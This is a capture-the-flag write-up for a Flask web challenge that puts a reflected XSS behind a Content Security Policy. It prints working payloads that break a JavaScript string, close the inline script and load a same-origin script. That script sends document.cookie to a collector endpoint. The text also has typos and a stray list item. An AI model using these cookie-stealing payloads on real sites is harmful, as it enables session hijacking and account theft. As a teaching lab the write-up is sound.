# XSS\_CSP – Personalised Write‑up

**Category:** Web – 150 pts
**Flag:** `flag{xss_csp}`

---


## Challenge Flow

1. The application only has a single point of `GET /?q=<value>`
2. Using `/?q=test` prints test on the page and in the console, showing q lands inside a `<script>` block
3. Looking at the code shows it only escapes `& < > "` so we can break the JS string with `";` because the single quote is still allowed
4. The server also sends `default-src 'self'; script-src 'self'` so inline code is blocked but we can load a new `<script src=...>` from the same origin, pointing it at **/c**
5. Build the payload of  `";</script><script src=/c?c='+document.cookie></script>` then URL‑encode it and call `/?q=%22%3B%3C/script%3E<script%20src=/c?c='+document.cookie></script>`
6. Visiting that URL sends a request to **/c?c=flag{xss\_csp}** and the server reveals the flag{xss_csp}

---









## How Difficulty Was Increased and Defense Mechanisms

I increased the difficulty that blocked the obvious script injections by using manual html escaping, this forces the solver to actually look at the website precisely. I also increased the difficulty by adding a chain of different elements that forced solvers to use string‑break, CSP bypass,  same‑origin script instead of using a one-liner.






## Indepth Build and Solution Notes

### Build Section

This CTF challenge is a tiny flask web app with 3 routes of 
- 
**What it is.**
A tiny Flask app with three routes: 
- `GET /` — renders a search page and inlines the user’s `q` value inside a `<script>` block.
- `GET /admin` — sets the flag as a cookie: `flag=flag{xss_csp}; Path=/; Secure`
- `GET /c` — “collector” that logs whatever arrives in the c query param to the server console.

Each response adds a `Content-Security-Policy: default-src 'self'; script-src 'self'`. This is because it blocks incline scripts and allows external scripts. As a result, the attack runs by loading a self‑hosted external script. The reason why XSS can occur in this task is because this is a reflected XSS using JavaScript strings, executed via a same-oridin external script comply with CSP. It is reflected because it is immediately sent to the servers response and nothing is stored. The vulnerability is because the page escapes q for input value in index and then injects q straight into javascript. The example in the code is too long so here is a simplified example below. 

```python
    "<script>"
    "let query = \"" + q + "\";"
    "console.log('User searched:', query);"
    "</script>"
```

Because of te filter used so that code works for HTML, there are some string that can still break the task with an example playload in `";alert(1)//`.


Howeverm because of the use of the Content Security Policy (CSP) which is a security feature that helps stop Cross-Site Scripting (XSS) attacks by controlling the resources a browser is allowed to load for a web page, inline JS does not work, an example of a failing test that would usually work is
```JavaScript
";fetch('/c?c='+document.cookie)//
```
But it does not work in this instance. 

This forces solvers to understand the line of JS string → HTML end‑script → external script. This means that the task requires the user to break the JS string, then break the inline script and finally inject a new external script. 


---

### Solution Section


0. Run the server
- Use python3 app.py in web-xss-csp
- Make sure that all depencies are present
- head to the home page `https://127.0.0.1:5000`

1. Plan the injection
- Context is inside `let query = "<HERE>";` so it breaks the string with `"` and then ;. close the script with `</script>`
- Insert an external `<script src="/x.js"></script>` that runs and executes
```js
new Image().src='/c?c='+encodeURIComponent(document.cookie);
```
which issues a GET to `/c?c=<cookie>`, and the server prints `Stolen: ...`.


2. Payload - URL-encoded

**Encoded**
```
/?q=%22%3B%3C%2Fscript%3E%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E
```

**Decoded**

```html
";</script><script src=/x.js></script>
```

3. Execute the payload

Using the website `https://127.0.0.1:5000/?q=%22%3B%3C%2Fscript%3E%3Cscript%20src%3D%2Fx.js%3E%3C%2Fscript%3E`

```
Stolen: flag{xss_csp}
```


---

## Related & Future Variants

- Stored XSS where the script is permanently stored on the vulnerable web server, often in a database, this can combine with sqli
- DOM-based XSS where the attack occurs entirely within the client-side code.


---

### Sources

* **MDN – Content Security Policy** https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
* **PortSwigger – DOM‑based XSS** https://portswigger.net/web-security/cross-site-scripting/dom-based
* **PayloadsAllTheThings – XSS** https://github.com/swisskyrepo/PayloadsAllTheThings#xss-cross-site-scripting
